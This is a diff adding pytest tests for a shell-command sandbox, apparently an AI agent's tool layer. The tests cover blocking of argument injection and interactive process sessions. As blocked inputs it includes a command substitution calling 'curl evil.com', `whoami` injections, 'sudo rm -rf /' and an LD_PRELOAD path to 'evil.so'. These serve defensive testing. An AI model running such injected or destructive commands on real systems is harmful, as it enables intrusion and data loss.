@@ -255,6 +255,62 @@ class TestTruncateOutput:
 # ---------------------------------------------------------------------------
 
 
+class TestArgumentInjection:
+    def test_dollar_paren_injection_blocked(self):
+        reason = st.blocked_command_reason(
+            'git commit -m "$(curl evil.com)"', ["git", "commit", "-m", "$(curl evil.com)"]
+        )
+        assert reason is not None
+
+    def test_backtick_injection_blocked(self):
+        reason = st.blocked_command_reason(
+            "find . -name `whoami`", ["find", ".", "-name", "`whoami`"]
+        )
+        assert reason is not None
+
+    def test_dollar_brace_injection_blocked(self):
+        reason = st.blocked_command_reason(
+            'echo "${PATH}"', ["echo", "${PATH}"]
+        )
+        assert reason is not None
+
+    def test_find_with_injection_blocked(self):
+        reason = st.blocked_command_reason(
+            'find . -name "$(whoami)"', ["find", ".", "-name", "$(whoami)"]
+        )
+        assert reason is not None
+
+    def test_safe_quoted_git_message_allowed(self):
+        reason = st.blocked_command_reason(
+            'git commit -m "fix bug"', ["git", "commit", "-m", "fix bug"]
+        )
+        assert reason is None
+
+    def test_safe_quoted_find_allowed(self):
+        reason = st.blocked_command_reason(
+            'find . -name "*.txt"', ["find", ".", "-name", "*.txt"]
+        )
+        assert reason is None
+
+    def test_single_quoted_injection_allowed(self):
+        reason = st.blocked_command_reason(
+            "find . -name '$(whoami)'", ["find", ".", "-name", "$(whoami)"]
+        )
+        assert reason is None
+
+    def test_safe_echo_allowed(self):
+        reason = st.blocked_command_reason(
+            "echo hello world", ["echo", "hello", "world"]
+        )
+        assert reason is None
+
+    def test_dollar_ansi_c_quoting_blocked(self):
+        reason = st.blocked_command_reason(
+            "echo $'\\n'", ["echo", "$'\\n'"]
+        )
+        assert reason is not None
+
+
 class TestBlockedCommandReason:
     def test_sudo_blocked(self):
         reason = st.blocked_command_reason("sudo rm -rf /", ["sudo", "rm", "-rf", "/"])
@@ -778,3 +834,193 @@ class TestSanitizedEnv:
         monkeypatch.setenv("LD_PRELOAD", "/tmp/evil.so")
         env = _sr._sanitized_env()
         assert "LD_PRELOAD" not in env
+
+
+class TestInteractiveShell:
+    @pytest.mark.asyncio
+    async def test_send_to_process_rejects_long_input(self, tmp_path):
+        class FakeProcess:
+            pid = 123
+            returncode = None
+
+            class FakeStdin:
+                closed = False
+
+                def write(self, text):
+                    pass
+
+                def flush(self):
+                    pass
+
+            def __init__(self):
+                self.stdin = self.FakeStdin()
+
+            def poll(self):
+                return self.returncode
+
+            def terminate(self):
+                self.returncode = -15
+
+            def kill(self):
+                self.returncode = -9
+
+            def wait(self, timeout=None):
+                return self.returncode
+
+        st.reset_process_sessions()
+        process = FakeProcess()
+        with st._PROCESS_SESSIONS_LOCK:
+            st._PROCESS_SESSIONS["test-session"] = st._ProcessSession(
+                session_id="test-session",
+                command="python3",
+                argv=["python3"],
+                cwd=tmp_path,
+                process=process,
+                risk_level="medium",
+                risk_reasons=[],
+            )
+
+        long_input = "x" * (_sr._MAX_INTERACTIVE_INPUT_CHARS + 1)
+        result = await st.send_to_process(
+            "test-session",
+            long_input,
+            request_approval=lambda *_args, **_kwargs: _approved(),
+        )
+        payload = __import__("json").loads(result)
+        assert payload["ok"] is False
+        assert payload["code"] == "input_too_long"
+        st.reset_process_sessions()
+
+    @pytest.mark.asyncio
+    async def test_send_to_process_rejects_missing_session(self):
+        st.reset_process_sessions()
+        result = await st.send_to_process(
+            "nonexistent",
+            "hello",
+            request_approval=lambda *_args, **_kwargs: _approved(),
+        )
+        payload = __import__("json").loads(result)
+        assert payload["ok"] is False
+        assert payload["code"] == "process_session_not_found"
+        st.reset_process_sessions()
+
+    @pytest.mark.asyncio
+    async def test_get_process_status_returns_snapshot(self, tmp_path):
+        class FakeProcess:
+            pid = 456
+            returncode = None
+
+            class FakeStdin:
+                closed = False
+
+                def write(self, text):
+                    pass
+
+                def flush(self):
+                    pass
+
+            def __init__(self):
+                self.stdin = self.FakeStdin()
+
+            def poll(self):
+                return self.returncode
+
+            def terminate(self):
+                pass
+
+            def kill(self):
+                pass
+
+            def wait(self, timeout=None):
+                return self.returncode
+
+        st.reset_process_sessions()
+        process = FakeProcess()
+        with st._PROCESS_SESSIONS_LOCK:
+            st._PROCESS_SESSIONS["status-test"] = st._ProcessSession(
+                session_id="status-test",
+                command="python3 -u test.py",
+                argv=["python3", "-u", "test.py"],
+                cwd=tmp_path,
+                process=process,
+                risk_level="low",
+                risk_reasons=[],
+            )
+
+        result = await st.get_process_status("status-test")
+        payload = __import__("json").loads(result)
+        assert payload["ok"] is True
+        assert payload["details"]["session_id"] == "status-test"
+        assert payload["details"]["command"] == "python3 -u test.py"
+        assert payload["details"]["pid"] == 456
+        assert payload["details"]["running"] is True
+        st.reset_process_sessions()
+
+    @pytest.mark.asyncio
+    async def test_get_process_status_rejects_missing_session(self):
+        st.reset_process_sessions()
+        result = await st.get_process_status("nonexistent")
+        payload = __import__("json").loads(result)
+        assert payload["ok"] is False
+        assert payload["code"] == "process_session_not_found"
+        st.reset_process_sessions()
+
+    @pytest.mark.asyncio
+    async def test_send_to_process_tracks_total_input_chars(self, tmp_path):
+        class FakeProcess:
+            pid = 123
+            returncode = None
+
+            class FakeStdin:
+                closed = False
+                writes = []
+
+                def write(self, text):
+                    self.writes.append(text)
+
+                def flush(self):
+                    pass
+
+            def __init__(self):
+                self.stdin = self.FakeStdin()
+
+            def poll(self):
+                return self.returncode
+
+            def terminate(self):
+                self.returncode = -15
+
+            def kill(self):
+                self.returncode = -9
+
+            def wait(self, timeout=None):
+                return self.returncode
+
+        st.reset_process_sessions()
+        process = FakeProcess()
+        with st._PROCESS_SESSIONS_LOCK:
+            session = st._ProcessSession(
+                session_id="input-track",
+                command="python3",
+                argv=["python3"],
+                cwd=tmp_path,
+                process=process,
+                risk_level="medium",
+                risk_reasons=[],
+            )
+            session.record_input("hello")
+            st._PROCESS_SESSIONS["input-track"] = session
+
+        result = await st.send_to_process(
+            "input-track",
+            "world",
+            request_approval=lambda *_args, **_kwargs: _approved(),
+        )
+        payload = __import__("json").loads(result)
+        assert payload["ok"] is True
+        assert payload["details"]["input_chars"] == 10
+        st.reset_process_sessions()
+
+    def test_constants_have_expected_values(self):
+        assert _sc._MAX_INTERACTIVE_INPUT_CHARS == 8000
+        assert _sc._MAX_INTERACTIVE_TOTAL_INPUT == 80000
